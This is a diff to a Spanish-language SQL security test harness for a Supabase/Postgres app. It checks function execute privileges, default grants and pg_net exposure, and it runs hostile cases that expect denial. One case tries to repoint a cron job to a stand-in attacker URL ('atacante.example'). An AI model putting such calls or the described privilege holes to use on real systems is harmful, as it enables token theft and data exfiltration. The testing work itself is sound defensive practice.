@@ -8792,6 +8792,323 @@ select pruebas_rls.registrar('26. Consejos (consejos_estado)',
            and tgname = 'consejos_estado_set_updated_at'));
 
 
+
+-- =============================================================================
+-- BLOQUE 27 — Superficie de ejecución: quién puede llamar a las funciones
+-- (Security Advisor / splinter, migración 20260818190000_hardening_advisor)
+-- -----------------------------------------------------------------------------
+-- POR QUÉ ESTE BLOQUE EXISTE. Hasta el Sprint 17 el arnés ya probaba, función
+-- por función, que `authenticated` NO podía ejecutar las SECURITY DEFINER
+-- privilegiadas ("A ejecuta generar_recordatorios_pendientes()", "Elena ejecuta
+-- leer_refresh_token_gmail sobre la cuenta de Rubén", y unas cuantas más). Esos
+-- casos pasaban. Pero pasaban por una razón que no era la nuestra: el stack
+-- local ya defaultea a "nada se auto-expone", mientras que el proyecto de
+-- Supabase cloud arrastra el `alter default privileges ... grant execute on
+-- functions to anon, authenticated, service_role` de la época en que `public`
+-- se auto-exponía. Nuestro `revoke ... from public` no borraba esos dos grants
+-- explícitos —PUBLIC es el pseudo-rol "todos", `anon` y `authenticated` son
+-- roles de verdad con su propia entrada en el ACL—, así que en PRODUCCIÓN las
+-- 50 funciones SECURITY DEFINER de `public` eran llamables por cualquiera con
+-- sesión, y 32 casos de este mismo arnés eran falsos en la única base que
+-- importa. El experimento está contado en el encabezado de la migración.
+--
+-- Este bloque prueba la superficie de ejecución COMO INVARIANTE ESTRUCTURAL, no
+-- función por función: cuenta y compara listas completas. Una función nueva que
+-- alguien exponga sin querer rompe el caso de la lista, no espera a que alguien
+-- se acuerde de escribirle su caso hostil. El caso 9 va más lejos y deja
+-- MEDIDA la trampa de fondo: una función nueva en `public` nace abierta a
+-- PUBLIC pase lo que pase con los privilegios por defecto, y por eso el revoke
+-- explícito de cada migración no es opcional. Los casos 11 y 12 hacen lo mismo
+-- con una deuda que NO se pudo cerrar (los grants de pg_net sobre el esquema
+-- `net`, que son de `supabase_admin` y `postgres` no puede revocar).
+--
+-- Los casos "SÍ puede" (17, 18) están para que el hardening no se pase de
+-- rosca: si alguien revoca de más, los predicados que las políticas RLS
+-- invocan dejan de funcionar y la app se cae entera. Que estén acá obliga a
+-- que cualquier ajuste futuro mantenga las dos direcciones.
+--
+-- No hace falta crear cuentas: casi todo se lee del catálogo, y los casos
+-- conductuales usan uuid de relleno —lo que se prueba es el privilegio, que
+-- Postgres verifica ANTES de ejecutar el cuerpo, así que el dato da igual—.
+-- =============================================================================
+\echo ''
+\echo '### BLOQUE 27 — superficie de ejecución de las funciones (Security Advisor)'
+
+-- ── 1–3. Nadie sin nombre y nadie anónimo: PUBLIC y anon, a cero.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'Ninguna función de public conserva EXECUTE de PUBLIC  [CRITERIO DE ACEPTACIÓN]', '0',
+       (select count(*)::text
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace,
+               lateral aclexplode(coalesce(p.proacl, acldefault('f', p.proowner))) a
+         where n.nspname = 'public' and a.privilege_type = 'EXECUTE' and a.grantee = 0));
+
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'Ninguna función de public es ejecutable por anon  [CRITERIO DE ACEPTACIÓN]', '0',
+       (select count(*)::text
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+         where n.nspname = 'public' and has_function_privilege('anon', p.oid, 'EXECUTE')));
+
+-- Éste es, literal, el lint 0028 del splinter ("Public Can Execute SECURITY
+-- DEFINER Function"): el que mostraba 50 avisos en el Advisor de producción.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'Lint 0028 (anon ejecuta SECURITY DEFINER): sin hallazgos', '0',
+       (select count(*)::text
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+         where n.nspname = 'public' and p.prosecdef
+           and has_function_privilege('anon', p.oid, 'EXECUTE')));
+
+-- ── 4–6. `authenticated`: exactamente las 19 previstas, ni una más.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'authenticated ejecuta exactamente 19 funciones de public', '19',
+       (select count(*)::text
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+         where n.nspname = 'public' and has_function_privilege('authenticated', p.oid, 'EXECUTE')));
+
+-- La lista, textual. Si alguien agrega o saca una, este caso lo dice con
+-- nombre y apellido en vez de mostrar un número que no cierra.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'La lista de funciones que authenticated ejecuta es EXACTAMENTE la prevista  [CRITERIO DE ACEPTACIÓN]',
+       'confirmar_documento_recien_subido,crear_perfil_gestionado,descartar_documento_recien_subido,'
+       || 'es_perfil_gestionado,es_sesion_de_usuario,es_titular,nombres_de_perfiles_vinculados,'
+       || 'perfil_actor,perfil_de_objeto_storage,perfil_id_por_email,puede_administrar_perfil,'
+       || 'puede_arrancar_administracion,puede_cargar_en_perfil,puede_graduar_perfil,'
+       || 'puede_otorgar_permisos,puede_ver_perfil,registrar_suscripcion_push,registrar_toma,revertir_toma',
+       (select string_agg(p.proname, ',' order by p.proname)
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+         where n.nspname = 'public' and has_function_privilege('authenticated', p.oid, 'EXECUTE')));
+
+-- De esas 19, 17 son SECURITY DEFINER: son las que el lint 0029 sigue
+-- reportando y que `docs/seguridad-rls.md` documenta como deliberadas (los
+-- predicados que invocan las políticas RLS + los RPC de escritura de la app).
+-- Las otras dos -es_sesion_de_usuario, perfil_de_objeto_storage- son INVOKER.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'De esas 19, 17 son SECURITY DEFINER (las que el lint 0029 reporta a propósito)', '17',
+       (select count(*)::text
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+         where n.nspname = 'public' and p.prosecdef
+           and has_function_privilege('authenticated', p.oid, 'EXECUTE')));
+
+-- ── 7. `service_role` (la clave del servidor) tampoco queda con todo.
+-- Las 23 que no están son las tres configurar_cron_*, las tres disparar_*,
+-- crear_perfil_de_cuenta() y las 16 de trigger y CHECK.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'service_role ejecuta exactamente 39 funciones (no las 62 del esquema)', '39',
+       (select count(*)::text
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace,
+               lateral aclexplode(coalesce(p.proacl, acldefault('f', p.proowner))) a
+         where n.nspname = 'public' and a.privilege_type = 'EXECUTE'
+           and pg_get_userbyid(a.grantee) = 'service_role'));
+
+-- ── 8–9. La fuente: los privilegios POR DEFECTO del esquema.
+-- Este es el caso que habría cazado el problema el primer día. En el proyecto
+-- de cloud, antes de la migración de hardening, este contador daba 3.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'Los privilegios por defecto de public/funciones no otorgan a PUBLIC, anon, authenticated ni service_role  [CRITERIO DE ACEPTACIÓN]', '0',
+       (select coalesce(count(*), 0)::text
+          from pg_default_acl d join pg_namespace n on n.oid = d.defaclnamespace,
+               lateral aclexplode(d.defaclacl) a
+         where n.nspname = 'public' and d.defaclobjtype = 'f'
+           and pg_get_userbyid(d.defaclrole) = 'postgres'
+           and a.privilege_type = 'EXECUTE'
+           and (a.grantee = 0 or pg_get_userbyid(a.grantee) in ('anon', 'authenticated', 'service_role'))));
+
+-- ── 9. LA TRAMPA, MEDIDA. Este caso no verifica que algo esté bien: verifica
+-- que algo SIGUE ESTANDO MAL, y por eso está escrito así a propósito.
+--
+-- Uno esperaría que, con el default del caso anterior en `{postgres=X}`, una
+-- función nueva naciera cerrada. No pasa: Postgres le pone `proacl = NULL`, que
+-- es su default interno `{=X/dueño, dueño=X/dueño}`, y ese `=X` es PUBLIC. O
+-- sea que el EXECUTE de PUBLIC —y con él el de `anon`, que es parte de PUBLIC—
+-- REAPARECE en cada `create function`, haga lo que haga el `alter default
+-- privileges`.
+--
+-- Se mide corriéndolo, en vez de dejarlo escrito en un comentario, por dos
+-- razones. La primera: es la justificación de por qué cada migración tiene que
+-- revocar a mano sus funciones nuevas, y de por qué el caso "ninguna función de
+-- public es ejecutable por anon" no se puede relajar nunca. La segunda: si
+-- algún día Postgres o Supabase cambian este comportamiento, este caso pasa a
+-- FAIL, alguien lee este comentario, y la nota se actualiza en vez de quedar
+-- mintiendo en un archivo durante dos años.
+--
+-- Se borra en el acto: no usa rollback porque el registro del resultado se
+-- iría con él.
+create function public.zz_arnes_privilegio_por_defecto() returns integer language sql as $$ select 1 $$;
+
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'TRAMPA MEDIDA: una función NUEVA en public nace ABIERTA a PUBLIC (por eso cada migración revoca a mano)',
+       'PUBLIC=true, anon=true, authenticated=true',
+       'PUBLIC=' || (exists (select 1 from pg_proc p, lateral aclexplode(coalesce(p.proacl, acldefault('f', p.proowner))) a
+                              where p.oid = 'public.zz_arnes_privilegio_por_defecto()'::regprocedure
+                                and a.grantee = 0 and a.privilege_type = 'EXECUTE'))::text
+       || ', anon=' || has_function_privilege('anon', 'public.zz_arnes_privilegio_por_defecto()', 'EXECUTE')::text
+       || ', authenticated=' || has_function_privilege('authenticated', 'public.zz_arnes_privilegio_por_defecto()', 'EXECUTE')::text);
+
+drop function public.zz_arnes_privilegio_por_defecto();
+
+-- ── 10. Lint 0011: ninguna función con search_path mutable.
+-- Ya era regla del proyecto (`set search_path = ''` en toda SECURITY DEFINER);
+-- acá queda medido, para que se note el día que a alguna se le escape.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'Lint 0011 (search_path mutable): ninguna función de public se escapó', '0',
+       (select count(*)::text
+          from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+         where n.nspname = 'public'
+           and not exists (select 1 from unnest(coalesce(p.proconfig, '{}')) c where c like 'search\_path=%')));
+
+-- ── 11–12. pg_net: DEUDA CONOCIDA, medida en vez de comentada.
+--
+-- pg_net otorga por su cuenta USAGE sobre el esquema `net` y EXECUTE sobre
+-- `net.http_post` / `net.http_get` a `anon` y `authenticated`. En potencia eso
+-- es un SSRF con la identidad de la base. La migración de hardening trajo los
+-- `revoke` correspondientes y hubo que sacarlos: **no se puede**. `net` y sus
+-- funciones son de `supabase_admin`, y `postgres` no es miembro suyo ni
+-- superusuario (ni en cloud ni acá), así que el `revoke` se ejecuta, no revoca
+-- nada y solo deja un WARNING que en un `db push` no lo ve nadie.
+--
+-- Se acepta porque `net` no está entre los esquemas que expone PostgREST
+-- (`public, graphql_public`): no hay `/rest/v1/rpc/http_post`. Llegar requiere
+-- ejecución de SQL arbitrario, y con eso pg_net ya es lo de menos.
+--
+-- Estos dos casos existen para que la deuda tenga un valor que se pueda mirar.
+-- El día que Supabase cambie ese default, o que alguien exponga `net`, cambian
+-- de valor y el tema vuelve a la mesa en vez de dormir en un comentario.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'El esquema net es de supabase_admin: por eso `postgres` no puede revocar sus grants', 'supabase_admin',
+       (select pg_get_userbyid(n.nspowner) from pg_namespace n where n.nspname = 'net'));
+
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'DEUDA CONOCIDA: anon/authenticated conservan EXECUTE sobre net.http_get y net.http_post (grant de Supabase, no revocable)',
+       'http_get,http_post',
+       coalesce((select string_agg(distinct p.proname, ',' order by p.proname)
+                   from pg_proc p join pg_namespace n on n.oid = p.pronamespace
+                  where n.nspname = 'net' and p.proname in ('http_post', 'http_get')
+                    and (has_function_privilege('anon', p.oid, 'EXECUTE')
+                      or has_function_privilege('authenticated', p.oid, 'EXECUTE'))),
+                '(ninguna)'));
+
+-- ── 13. Los crons siguen en pie. El hardening no toca privilegios de
+-- `postgres`, que es con quien corren los cuatro jobs; este caso lo deja
+-- escrito para que un cambio futuro de privilegios no los apague de costado.
+select pruebas_rls.registrar('27. Superficie de ejecución',
+       'Los cuatro jobs de pg_cron siguen activos y corriendo como postgres  [CRITERIO DE ACEPTACIÓN]', '4',
+       (select count(*)::text from cron.job
+         where jobname in ('recordatorios-turnos', 'generar-tomas-del-dia',
+                           'alertas-medicacion', 'barrido-gmail')
+           and active and username = 'postgres'));
+
+-- ── 14–18. Lo mismo, pero probado desde adentro de una sesión `authenticated`:
+-- que el privilegio no esté es una cosa, que Postgres devuelva 42501 al
+-- intentarlo es la que le importa a quien ataca.
+begin;
+select set_config('request.jwt.claims', '{"sub":"f2700aaa-1111-4111-8111-111111111111","role":"authenticated"}', true);
+set local role authenticated;
+
+do $$
+declare v text; t text;
+begin
+    begin
+        select public.leer_refresh_token_gmail('f2700aaa-1111-4111-8111-111111111111') into t;
+        v := 'ejecutada';
+    exception when insufficient_privilege then v := 'denegada (42501)';
+             when others                  then v := 'error ' || sqlstate;
+    end;
+    perform pruebas_rls.registrar('27. Superficie de ejecución',
+        'authenticated ejecuta leer_refresh_token_gmail (leía el token de Gmail de CUALQUIER cuenta)  [CASO HOSTIL]',
+        'denegada (42501)', v);
+end $$;
+
+do $$
+declare v text;
+begin
+    begin
+        perform public.configurar_cron_recordatorios('https://atacante.example/robo', 'secreto-del-atacante');
+        v := 'ejecutada';
+    exception when insufficient_privilege then v := 'denegada (42501)';
+             when others                  then v := 'error ' || sqlstate;
+    end;
+    perform pruebas_rls.registrar('27. Superficie de ejecución',
+        'authenticated ejecuta configurar_cron_recordatorios (reapuntaba el cron a su propia URL)  [CASO HOSTIL]',
+        'denegada (42501)', v);
+end $$;
+
+do $$
+declare v text; c integer;
+begin
+    begin
+        select count(*) into c from public.destinatarios_de_avisos('f2700aaa-1111-4111-8111-111111111111');
+        v := 'ejecutada';
+    exception when insufficient_privilege then v := 'denegada (42501)';
+             when others                  then v := 'error ' || sqlstate;
+    end;
+    perform pruebas_rls.registrar('27. Superficie de ejecución',
+        'authenticated ejecuta destinatarios_de_avisos (fuga de user_id ajenos)  [CASO HOSTIL]',
+        'denegada (42501)', v);
+end $$;
+
+-- Y las dos direcciones: el camino permitido sigue abierto. Si el hardening se
+-- pasara de rosca acá, las políticas RLS que invocan estos predicados
+-- dejarían de evaluarse y la app entera devolvería 42501.
+do $$
+declare v text; t uuid;
+begin
+    begin
+        select public.perfil_actor() into t;
+        v := 'ejecutada';
+    exception when insufficient_privilege then v := 'denegada (42501)';
+             when others                  then v := 'error ' || sqlstate;
+    end;
+    perform pruebas_rls.registrar('27. Superficie de ejecución',
+        'authenticated SÍ ejecuta perfil_actor() (el hardening no se pasó de rosca)', 'ejecutada', v);
+end $$;
+
+do $$
+declare v text; t boolean;
+begin
+    begin
+        select public.es_titular('f2700aaa-1111-4111-8111-111111111111') into t;
+        v := 'ejecutada';
+    exception when insufficient_privilege then v := 'denegada (42501)';
+             when others                  then v := 'error ' || sqlstate;
+    end;
+    perform pruebas_rls.registrar('27. Superficie de ejecución',
+        'authenticated SÍ ejecuta es_titular() (predicado que invocan las políticas RLS)', 'ejecutada', v);
+end $$;
+
+commit;
+
+-- ── 19–20. Y desde `anon`, que es el rol de la clave pública: nada.
+begin;
+set local role anon;
+
+do $$
+declare v text; t boolean;
+begin
+    begin
+        select public.puede_ver_perfil('f2700aaa-1111-4111-8111-111111111111') into t;
+        v := 'ejecutada';
+    exception when insufficient_privilege then v := 'denegada (42501)';
+             when others                  then v := 'error ' || sqlstate;
+    end;
+    perform pruebas_rls.registrar('27. Superficie de ejecución',
+        'anon ejecuta puede_ver_perfil  [CASO HOSTIL]', 'denegada (42501)', v);
+end $$;
+
+do $$
+declare v text; t uuid;
+begin
+    begin
+        select public.perfil_actor() into t;
+        v := 'ejecutada';
+    exception when insufficient_privilege then v := 'denegada (42501)';
+             when others                  then v := 'error ' || sqlstate;
+    end;
+    perform pruebas_rls.registrar('27. Superficie de ejecución',
+        'anon ejecuta perfil_actor  [CASO HOSTIL]', 'denegada (42501)', v);
+end $$;
+
+commit;
+
+
 -- =============================================================================
 -- RESUMEN
 -- =============================================================================
